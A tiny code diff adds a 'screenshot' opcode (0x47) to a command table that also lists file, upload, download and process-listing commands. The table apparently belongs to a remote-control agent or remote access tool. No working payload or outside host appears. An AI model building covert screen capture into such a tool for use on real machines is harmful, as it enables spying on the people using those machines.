@@ -22,6 +22,7 @@ commands = {
     "mkdir": 0x44, 
     "cp": 0x45, 
     "cat": 0x46, 
+    "screenshot": 0x47,
     "upload": 0x50, 
     "download": 0x51,
     "ps": 0x52, 
